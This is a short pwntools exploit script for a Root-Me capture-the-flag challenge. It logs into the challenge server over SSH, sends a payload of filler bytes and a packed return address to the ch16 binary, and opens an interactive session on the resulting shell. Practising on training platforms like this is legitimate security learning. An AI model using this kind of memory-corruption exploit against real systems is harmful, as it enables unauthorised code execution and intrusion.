from pwn import *

#r = remote("pwnable.kr", 9000)
#r = process("./ch15")
s = ssh(user='app-systeme-ch16', host='challenge02.root-me.org', port=2222, password='app-systeme-ch16')
r = s.process("./ch16")
dummy = "\x08"*4
#add = "\x16\x85\x04\x08"
add = p32(0xbffffabc)
payload = bytes(dummy,'ascii') + add
r.sendline(payload)
#print (r.recv())
r.interactive()
